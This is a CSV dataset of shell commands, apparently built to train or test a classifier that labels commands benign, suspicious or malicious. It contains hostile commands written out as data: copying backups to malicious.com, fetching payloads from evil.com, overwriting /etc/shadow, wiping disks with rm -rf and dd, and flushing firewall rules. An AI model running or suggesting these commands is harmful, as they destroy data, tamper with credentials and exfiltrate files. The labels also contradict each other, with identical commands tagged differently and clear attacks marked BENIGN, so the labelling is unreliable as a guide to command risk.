command,label
scp backup.sql   admin@192.168.0.2:/tmp/,SUSPICIOUS
SCP   FILE.TXT ADMIN@BACKUP.SERVER:/ROOT/,BENIGN
WATCH NETSTAT   -AN,SUSPICIOUS
ECHO 'HELLO   WORLD',BENIGN
 ECHO 'PWNED' >> /ETC/SHADOW,MALICIOUS
PS   AUX | GREP NGINX,MALICIOUS
 curl -O http://suspicious.org/payload.sh,MALICIOUS
echo 'hacked'   > /etc/shadow,MALICIOUS
 wget http://suspicious.org/update.bin,BENIGN
 curl https://fileshare.com/payload.sh,MALICIOUS
scp file.txt admin@192.168.0.2:/tmp/,SUSPICIOUS
WATCH NETSTAT -AN ,SUSPICIOUS
curl -O http://fileshare.com/exploit.zip ,MALICIOUS
ENV ,SUSPICIOUS
CURL -O   HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
ECHO 'HACKED' >> /ROOT/.BASHRC,MALICIOUS
echo 'pwned' >   /etc/shadow,BENIGN
SCP DATA.TAR.GZ ROOT@MALICIOUS.COM:/ROOT/,SUSPICIOUS
 curl https://suspicious.org/update.bin,MALICIOUS
curl   -O http://evil.com/update.bin,MALICIOUS
CURL -O   HTTP://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS
curl -o http://fileshare.com/exploit.zip,SUSPICIOUS
ECHO 'OWNED' > /VAR/LOG/SYSLOG ,SUSPICIOUS
LS /ROOT/ ,SUSPICIOUS
CURL   HTTPS://EVIL.COM/UPDATE.BIN,MALICIOUS
ECHO   'PWNED' >> /ROOT/.BASHRC,SUSPICIOUS
scp data.tar.gz   admin@192.168.0.2:/tmp/,SUSPICIOUS
 echo 'hacked' >> /etc/shadow,MALICIOUS
SCP DATA.TAR.GZ   ADMIN@MALICIOUS.COM:/TMP/,BENIGN
RM -RF /HOME/USER ,MALICIOUS
SCP BACKUP.SQL USER@BACKUP.SERVER:/VAR/WWW ,BENIGN
LS   -AL,BENIGN
ls /var/www ,SUSPICIOUS
SCP DATA.TAR.GZ   ADMIN@MALICIOUS.COM:/ROOT/,BENIGN
ECHO 'PWNED' > /ROOT/.BASHRC ,SUSPICIOUS
touch homework.doc ,BENIGN
ECHO 'PWNED' > /VAR/LOG/SYSLOG,SUSPICIOUS
 ECHO 'PWNED' > /ETC/SHADOW,MALICIOUS
scp   file.txt user@backup.server:/tmp/,BENIGN
scp data.tar.gz   root@192.168.0.2:/tmp/,SUSPICIOUS
scp file.txt admin@192.168.0.2:/var/www,MALICIOUS
 IFCONFIG,BENIGN
scp backup.sql admin@malicious.com:/root/,SUSPICIOUS
 SCP DATA.TAR.GZ USER@MALICIOUS.COM:/TMP/,BENIGN
scp   data.tar.gz root@192.168.0.2:/root/,SUSPICIOUS
ECHO 'HELLO' ,BENIGN
 SCP BACKUP.SQL USER@MALICIOUS.COM:/VAR/WWW,MALICIOUS
scp   data.tar.gz admin@192.168.0.2:/tmp/,MALICIOUS
scp file.txt root@malicious.com:/root/,MALICIOUS
echo 'owned'   >> /root/.bashrc,SUSPICIOUS
SUDO APT INSTALL NMAP,SUSPICIOUS
 CHMOD 777 /VAR/LOG/SYSLOG,MALICIOUS
curl https://evil.com/exploit.zip ,SUSPICIOUS
SCP   DATA.TAR.GZ ROOT@BACKUP.SERVER:/VAR/WWW,SUSPICIOUS
scp data.tar.gz   user@malicious.com:/var/www,SUSPICIOUS
CAT .BASHRC ,BENIGN
 ssh -l 8080:target.com:80 attacker@remote,MALICIOUS
 CD /TMP/,SUSPICIOUS
scp file.txt   root@192.168.0.2:/root/,SUSPICIOUS
echo 'owned' >> /var/log/syslog ,BENIGN
SUDO APT INSTALL   NET-TOOLS,SUSPICIOUS
curl   -O http://suspicious.org/update.bin,BENIGN
 curl https://evil.com/exploit.zip,SUSPICIOUS
 scp data.tar.gz root@backup.server:/tmp/,MALICIOUS
 curl https://evil.com/update.bin,SUSPICIOUS
CAT README.MD ,BENIGN
ECHO 'HACKED' > /ETC/SHADOW,MALICIOUS
scp data.tar.gz root@192.168.0.2:/tmp/ ,MALICIOUS
HISTORY ,SUSPICIOUS
 CAT /HOME/USER/INFO.TXT,BENIGN
 echo 'owned' >> /var/log/syslog,SUSPICIOUS
SSH -L 8080:TARGET.COM:80   ATTACKER@REMOTE,MALICIOUS
WGET HTTP://FILESHARE.COM/EXPLOIT.ZIP,BENIGN
WGET   HTTP://SUSPICIOUS.ORG/UPDATE.BIN,BENIGN
CAT /ETC/PASSWD ,MALICIOUS
CAT   WELCOME.TXT,BENIGN
df -h ,BENIGN
echo   'owned' > /etc/shadow,SUSPICIOUS
scp backup.sql   user@backup.server:/root/,SUSPICIOUS
ECHO   'PWNED' >> /ETC/SHADOW,SUSPICIOUS
scp data.tar.gz admin@192.168.0.2:/root/,BENIGN
 CAT /VAR/LOG/SYSLOG,SUSPICIOUS
scp backup.sql user@backup.server:/var/www,MALICIOUS
curl -O http://evil.com/update.bin ,SUSPICIOUS
echo 'owned'   > /etc/shadow,MALICIOUS
scp file.txt user@malicious.com:/tmp/,SUSPICIOUS
CURL -O HTTP://EVIL.COM/PAYLOAD.SH ,MALICIOUS
scp backup.sql   root@malicious.com:/root/,BENIGN
SCP BACKUP.SQL   ADMIN@MALICIOUS.COM:/TMP/,SUSPICIOUS
scp   file.txt user@192.168.0.2:/tmp/,BENIGN
PS AUX   | GREP MYSQL,SUSPICIOUS
ECHO 'PWNED' > /VAR/LOG/SYSLOG ,BENIGN
scp data.tar.gz root@192.168.0.2:/tmp/,MALICIOUS
curl   -O http://evil.com/exploit.zip,MALICIOUS
CURL -O HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,BENIGN
IFCONFIG ,BENIGN
ECHO   'OWNED' >> /VAR/LOG/SYSLOG,MALICIOUS
CAT /ROOT/.BASHRC ,SUSPICIOUS
 scp data.tar.gz user@192.168.0.2:/root/,BENIGN
echo 'hacked' >   /var/log/syslog,MALICIOUS
CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN ,MALICIOUS
curl -O http://fileshare.com/update.bin ,MALICIOUS
 CAT ~/.SSH/KNOWN_HOSTS,SUSPICIOUS
echo   'owned' > /var/log/syslog,MALICIOUS
echo 'pwned' > /var/log/syslog ,BENIGN
curl   -o http://fileshare.com/update.bin,SUSPICIOUS
echo 'pwned'   >> /var/log/syslog,SUSPICIOUS
 IPTABLES -F,MALICIOUS
CURL HTTP://UNKNOWN.SITE/SCRIPT.SH ,SUSPICIOUS
scp file.txt   root@malicious.com:/tmp/,MALICIOUS
scp   backup.sql user@192.168.0.2:/root/,MALICIOUS
 SCP FILE.TXT ROOT@MALICIOUS.COM:/TMP/,MALICIOUS
curl https://fileshare.com/exploit.zip ,BENIGN
curl   -O http://fileshare.com/update.bin,BENIGN
 SUDO APT INSTALL NET-TOOLS,SUSPICIOUS
CURL   -O HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,BENIGN
curl   -O http://evil.com/payload.sh,BENIGN
echo 'hacked' >>   /etc/shadow,MALICIOUS
SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE ,MALICIOUS
 scp data.tar.gz admin@malicious.com:/var/www,MALICIOUS
ps aux |   grep mysql,MALICIOUS
SCP BACKUP.SQL ROOT@MALICIOUS.COM:/ROOT/,SUSPICIOUS
 curl -O http://evil.com/payload.sh,SUSPICIOUS
CURL   HTTPS://FILESHARE.COM/EXPLOIT.ZIP,BENIGN
SCP   FILE.TXT ROOT@BACKUP.SERVER:/TMP/,SUSPICIOUS
CURL -O HTTP://EVIL.COM/EXPLOIT.ZIP ,MALICIOUS
CURL HTTPS://FILESHARE.COM/PAYLOAD.SH,MALICIOUS
 echo 'pwned' > /var/log/syslog,MALICIOUS
 CHMOD 777 /ROOT/.BASHRC,SUSPICIOUS
SUDO APT   INSTALL NMAP,SUSPICIOUS
CURL -O   HTTP://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS
ECHO 'PWNED'   > /ETC/SHADOW,BENIGN
scp file.txt   user@192.168.0.2:/tmp/,BENIGN
ECHO 'HACKED' >> /ETC/SHADOW,SUSPICIOUS
 scp backup.sql user@malicious.com:/tmp/,SUSPICIOUS
echo 'owned'   > /var/log/syslog,SUSPICIOUS
ECHO 'HACKED' > /VAR/LOG/SYSLOG,MALICIOUS
scp   backup.sql root@192.168.0.2:/var/www,MALICIOUS
echo   'pwned' >> /var/log/syslog,MALICIOUS
SUDO APT INSTALL   HTOP,BENIGN
DD IF=/DEV/ZERO   OF=/DEV/SDA,MALICIOUS
echo   'pwned' > /etc/shadow,MALICIOUS
scp   backup.sql root@backup.server:/root/,MALICIOUS
CURL HTTPS://EVIL.COM/PAYLOAD.SH ,MALICIOUS
SCP BACKUP.SQL ADMIN@BACKUP.SERVER:/TMP/,BENIGN
SUDO APT   INSTALL NET-TOOLS,SUSPICIOUS
WGET HTTP://EVIL.COM/UPDATE.BIN,SUSPICIOUS
scp data.tar.gz   user@192.168.0.2:/tmp/,BENIGN
CURL HTTPS://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS
CURL HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH,MALICIOUS
echo   'owned' >> /etc/shadow,BENIGN
SCP BACKUP.SQL USER@BACKUP.SERVER:/VAR/WWW,BENIGN
scp   data.tar.gz user@192.168.0.2:/root/,MALICIOUS
scp data.tar.gz user@malicious.com:/var/www ,SUSPICIOUS
scp   backup.sql admin@malicious.com:/var/www,BENIGN
 curl -o http://fileshare.com/exploit.zip,BENIGN
 echo 'pwned' >> /root/.bashrc,MALICIOUS
TOP -N   1,BENIGN
 echo 'hacked' > /etc/shadow,SUSPICIOUS
scp file.txt   root@malicious.com:/root/,BENIGN
scp file.txt user@malicious.com:/var/www ,SUSPICIOUS
CD   /VAR/WWW,MALICIOUS
curl -O http://suspicious.org/payload.sh ,SUSPICIOUS
echo 'hacked' >   /etc/shadow,BENIGN
CURL HTTPS://EVIL.COM/UPDATE.BIN,SUSPICIOUS
scp data.tar.gz user@malicious.com:/tmp/ ,SUSPICIOUS
echo   'hacked' >> /var/log/syslog,BENIGN
curl -o   http://suspicious.org/update.bin,BENIGN
 CURL HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS
curl -o   http://evil.com/update.bin,BENIGN
SCP FILE.TXT   USER@MALICIOUS.COM:/VAR/WWW,BENIGN
scp backup.sql root@malicious.com:/tmp/ ,MALICIOUS
 PS AUX,SUSPICIOUS
 SCP FILE.TXT ROOT@BACKUP.SERVER:/VAR/WWW,MALICIOUS
curl -O   http://evil.com/exploit.zip,SUSPICIOUS
 wget http://evil.com/exploit.zip,BENIGN
curl -o http://fileshare.com/exploit.zip ,MALICIOUS
scp backup.sql   admin@192.168.0.2:/root/,BENIGN
scp data.tar.gz   root@backup.server:/root/,BENIGN
echo   'hacked' >> /root/.bashrc,MALICIOUS
 SUDO -L,SUSPICIOUS
scp file.txt   user@malicious.com:/var/www,MALICIOUS
 scp data.tar.gz root@backup.server:/var/www,MALICIOUS
ECHO 'OWNED' >> /VAR/LOG/SYSLOG,BENIGN
CURL HTTPS://FILESHARE.COM/EXPLOIT.ZIP,MALICIOUS
scp backup.sql root@malicious.com:/var/www ,MALICIOUS
 TOUCH HOMEWORK.DOC,BENIGN
ECHO 'PWNED' >> /ETC/SHADOW ,MALICIOUS
cd /tmp/ ,BENIGN
RM   -RF /VAR/,SUSPICIOUS
 WGET HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,BENIGN
scp data.tar.gz admin@backup.server:/root/ ,MALICIOUS
CURL -O HTTP://EVIL.COM/UPDATE.BIN,MALICIOUS
ECHO 'HACKED'   > /VAR/LOG/SYSLOG,MALICIOUS
 CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH,BENIGN
 echo 'owned' > /etc/shadow,MALICIOUS
 FIND / -NAME 'TEST',BENIGN
WGET HTTP://EVIL.COM/EXPLOIT.ZIP,MALICIOUS
 SCP BACKUP.SQL ADMIN@192.168.0.2:/TMP/,MALICIOUS
scp data.tar.gz admin@192.168.0.2:/tmp/ ,BENIGN
PWD ,BENIGN
curl https://suspicious.org/payload.sh ,BENIGN
SCP   FILE.TXT ROOT@BACKUP.SERVER:/ROOT/,BENIGN
curl -o http://fileshare.com/payload.sh,MALICIOUS
WGET   HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
 LS -AL,BENIGN
SUDO APT   UPDATE,BENIGN
scp   file.txt user@backup.server:/var/www,MALICIOUS
scp data.tar.gz admin@backup.server:/tmp/,MALICIOUS
 CURL HTTPS://FILESHARE.COM/UPDATE.BIN,SUSPICIOUS
curl -o   http://suspicious.org/payload.sh,SUSPICIOUS
echo 'hacked' >>   /var/log/syslog,MALICIOUS
CURL   HTTPS://FILESHARE.COM/UPDATE.BIN,BENIGN
curl -O   http://fileshare.com/exploit.zip,MALICIOUS
scp file.txt   root@backup.server:/root/,MALICIOUS
scp data.tar.gz   admin@192.168.0.2:/var/www,MALICIOUS
 ECHO 'HELLO WORLD',BENIGN
SCP DATA.TAR.GZ ADMIN@MALICIOUS.COM:/VAR/WWW,BENIGN
 scp backup.sql user@backup.server:/tmp/,SUSPICIOUS
curl   -o http://suspicious.org/exploit.zip,BENIGN
RM -RF /*   --NO-PRESERVE-ROOT,MALICIOUS
echo 'pwned'   > /var/log/syslog,BENIGN
MKDIR TEST ,BENIGN
 ECHO 'HACKED' > /VAR/LOG/SYSLOG,SUSPICIOUS
scp backup.sql   user@malicious.com:/root/,MALICIOUS
CAT /HOME/USER/TODO.TXT ,BENIGN
 CURL -O HTTP://EVIL.COM/PAYLOAD.SH,MALICIOUS
SCP DATA.TAR.GZ USER@MALICIOUS.COM:/ROOT/,MALICIOUS
 scp data.tar.gz root@malicious.com:/root/,SUSPICIOUS
WGET HTTP://FILESHARE.COM/UPDATE.BIN ,SUSPICIOUS
PS AUX | GREP   SSHD,MALICIOUS
 CD /ROOT,SUSPICIOUS
WGET   HTTP://EVIL.COM/EXPLOIT.ZIP,MALICIOUS
CURL HTTPS://FILESHARE.COM/EXPLOIT.ZIP ,SUSPICIOUS
CAT /ETC/SHADOW ,SUSPICIOUS
scp backup.sql root@192.168.0.2:/var/www ,MALICIOUS
 wget http://suspicious.org/exploit.zip,MALICIOUS
curl https://evil.com/update.bin ,BENIGN
scp   backup.sql admin@192.168.0.2:/root/,MALICIOUS
scp data.tar.gz admin@malicious.com:/root/ ,MALICIOUS
CURL -O HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,MALICIOUS
 ECHO 'OWNED' > /ROOT/.BASHRC,MALICIOUS
SCP DATA.TAR.GZ USER@BACKUP.SERVER:/TMP/,BENIGN
echo 'owned'   >> /var/log/syslog,MALICIOUS
WGET HTTP://SUSPICIOUS.ORG/UPDATE.BIN ,BENIGN
 SUDO SU,SUSPICIOUS
PS AUX | GREP   MYSQL,SUSPICIOUS
SCP DATA.TAR.GZ ADMIN@MALICIOUS.COM:/ROOT/,BENIGN
scp file.txt   admin@backup.server:/tmp/,SUSPICIOUS
scp data.tar.gz root@malicious.com:/tmp/ ,BENIGN
 GREP ROOT /ETC/PASSWD,SUSPICIOUS
LS /VAR/WWW ,MALICIOUS
CURL HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH ,MALICIOUS
echo 'hacked' > /var/log/syslog ,BENIGN
SCP BACKUP.SQL USER@MALICIOUS.COM:/VAR/WWW,SUSPICIOUS
scp data.tar.gz root@backup.server:/root/,SUSPICIOUS
ECHO 'HACKED' > /VAR/LOG/SYSLOG ,SUSPICIOUS
scp backup.sql   admin@backup.server:/tmp/,SUSPICIOUS
scp   data.tar.gz admin@backup.server:/tmp/,SUSPICIOUS
SCP DATA.TAR.GZ   USER@BACKUP.SERVER:/TMP/,SUSPICIOUS
 CURL HTTPS://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
 LS /TMP/,BENIGN
scp   file.txt root@backup.server:/root/,MALICIOUS
ECHO   'HELLO WORLD',BENIGN
echo 'owned' > /var/log/syslog ,SUSPICIOUS
SCP BACKUP.SQL ROOT@192.168.0.2:/VAR/WWW,SUSPICIOUS
scp file.txt   admin@malicious.com:/var/www,MALICIOUS
ECHO 'PWNED' >> /VAR/LOG/SYSLOG ,SUSPICIOUS
scp   file.txt admin@backup.server:/tmp/,SUSPICIOUS
CURL -O HTTP://FILESHARE.COM/PAYLOAD.SH,BENIGN
 scp backup.sql user@192.168.0.2:/tmp/,BENIGN
echo 'owned' >   /etc/shadow,SUSPICIOUS
CURL   HTTPS://EVIL.COM/EXPLOIT.ZIP,BENIGN
 WGET HTTP://EVIL.COM/PAYLOAD.SH,SUSPICIOUS
PS AUX ,SUSPICIOUS
scp backup.sql admin@192.168.0.2:/root/ ,SUSPICIOUS
scp   data.tar.gz user@192.168.0.2:/var/www,MALICIOUS
 scp data.tar.gz admin@backup.server:/root/,SUSPICIOUS
TOUCH HOMEWORK.DOC ,BENIGN
scp backup.sql   admin@malicious.com:/root/,MALICIOUS
WGET HTTP://FILESHARE.COM/PAYLOAD.SH ,BENIGN
 scp file.txt root@backup.server:/root/,SUSPICIOUS
curl -o http://suspicious.org/payload.sh,SUSPICIOUS
 scp file.txt user@192.168.0.2:/var/www,BENIGN
echo   'owned' > /root/.bashrc,BENIGN
SCP DATA.TAR.GZ USER@MALICIOUS.COM:/TMP/ ,BENIGN
CD   /ROOT/,MALICIOUS
CD /VAR/WWW ,BENIGN
curl   -o http://fileshare.com/payload.sh,BENIGN
CURL   -O HTTP://FILESHARE.COM/EXPLOIT.ZIP,SUSPICIOUS
ECHO 'PWNED' >> /ETC/SHADOW,SUSPICIOUS
PS AUX | GREP MYSQL,BENIGN
scp backup.sql   user@192.168.0.2:/var/www,BENIGN
SCP   DATA.TAR.GZ ROOT@MALICIOUS.COM:/TMP/,SUSPICIOUS
WGET HTTP://FILESHARE.COM/PAYLOAD.SH,MALICIOUS
CURL -O HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS
 CURL -O HTTP://SUSPICIOUS.ORG/PAYLOAD.SH,BENIGN
scp data.tar.gz admin@malicious.com:/tmp/,BENIGN
scp   backup.sql root@malicious.com:/var/www,SUSPICIOUS
SCP DATA.TAR.GZ ROOT@192.168.0.2:/VAR/WWW,BENIGN
WGET HTTP://EVIL.COM/EXPLOIT.ZIP ,BENIGN
scp file.txt admin@192.168.0.2:/tmp/ ,SUSPICIOUS
ssh -l 8080:target.com:80   attacker@remote,MALICIOUS
 SCP BACKUP.SQL ROOT@192.168.0.2:/TMP/,MALICIOUS
GREP 'PASSWORD'   /ETC/PASSWD,MALICIOUS
scp   file.txt user@malicious.com:/var/www,SUSPICIOUS
scp data.tar.gz   user@192.168.0.2:/var/www,BENIGN
PS AUX |   GREP NGINX,BENIGN
CHMOD   777 /ROOT/.BASHRC,MALICIOUS
scp   data.tar.gz root@backup.server:/var/www,BENIGN
echo 'pwned' > /etc/shadow ,MALICIOUS
SCP DATA.TAR.GZ ROOT@BACKUP.SERVER:/VAR/WWW,MALICIOUS
SCP   FILE.TXT ROOT@BACKUP.SERVER:/VAR/WWW,BENIGN
PS AUX | GREP NGINX ,BENIGN
 LS /VAR/WWW,MALICIOUS
PS AUX |   GREP SSHD,SUSPICIOUS
CURL -O   HTTP://EVIL.COM/UPDATE.BIN,SUSPICIOUS
 scp backup.sql root@backup.server:/var/www,MALICIOUS
scp data.tar.gz   user@192.168.0.2:/root/,SUSPICIOUS
scp data.tar.gz   admin@malicious.com:/tmp/,MALICIOUS
 scp data.tar.gz admin@192.168.0.2:/var/www,MALICIOUS
scp data.tar.gz admin@malicious.com:/var/www ,BENIGN
CURL   -O HTTP://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS
 CURL HTTPS://SUSPICIOUS.ORG/PAYLOAD.SH,SUSPICIOUS
ECHO 'OWNED'   > /ETC/SHADOW,BENIGN
CURL -O   HTTP://FILESHARE.COM/UPDATE.BIN,MALICIOUS
 GREP 'PASSWORD' /ETC/PASSWD,MALICIOUS
SUDO APT   INSTALL HTOP,SUSPICIOUS
LS   /TMP/,MALICIOUS
scp file.txt   user@backup.server:/tmp/,MALICIOUS
ECHO 'OWNED' >>   /VAR/LOG/SYSLOG,BENIGN
scp   file.txt admin@192.168.0.2:/root/,BENIGN
 CD /VAR/WWW,BENIGN
 WHICH PYTHON,SUSPICIOUS
RM -RF   /HOME/USER,MALICIOUS
curl -o   http://suspicious.org/exploit.zip,SUSPICIOUS
 SCP BACKUP.SQL ADMIN@MALICIOUS.COM:/ROOT/,MALICIOUS
curl   -O http://fileshare.com/exploit.zip,MALICIOUS
 curl -O http://evil.com/update.bin,SUSPICIOUS
curl -o http://malicious.com/malware.bin ,MALICIOUS
scp   backup.sql root@malicious.com:/root/,SUSPICIOUS
ECHO 'OWNED' >> /ETC/SHADOW,BENIGN
 curl https://suspicious.org/payload.sh,BENIGN
 scp file.txt root@192.168.0.2:/tmp/,SUSPICIOUS
CURL HTTPS://SAFE-SITE.ORG/UPDATE.SH ,BENIGN
scp backup.sql root@malicious.com:/root/ ,SUSPICIOUS
ECHO 'OWNED' >> /ETC/SHADOW ,BENIGN
scp backup.sql admin@backup.server:/root/ ,MALICIOUS
ECHO 'PWNED'   >> /ETC/SHADOW,BENIGN
CURL -O HTTP://EVIL.COM/UPDATE.BIN ,SUSPICIOUS
 DF -H,BENIGN
ECHO 'HACKED' > /ETC/SHADOW ,BENIGN
SCP   FILE.TXT USER@192.168.0.2:/TMP/,SUSPICIOUS
SCP FILE.TXT ADMIN@BACKUP.SERVER:/TMP/,SUSPICIOUS
PS AUX | GREP SSHD ,SUSPICIOUS
 scp backup.sql user@192.168.0.2:/root/,MALICIOUS
SCP FILE.TXT ADMIN@BACKUP.SERVER:/VAR/WWW,MALICIOUS
SCP   DATA.TAR.GZ USER@MALICIOUS.COM:/ROOT/,SUSPICIOUS
ECHO 'OWNED'   >> /ETC/SHADOW,BENIGN
scp file.txt   admin@malicious.com:/root/,SUSPICIOUS
SCP DATA.TAR.GZ   USER@MALICIOUS.COM:/ROOT/,MALICIOUS
scp file.txt   admin@backup.server:/var/www,MALICIOUS
CURL HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,SUSPICIOUS
scp data.tar.gz   root@192.168.0.2:/root/,SUSPICIOUS
CHMOD 777   /ROOT/.BASHRC,MALICIOUS
curl   -o http://fileshare.com/exploit.zip,BENIGN
scp   data.tar.gz user@malicious.com:/root/,SUSPICIOUS
curl   -O http://suspicious.org/payload.sh,MALICIOUS
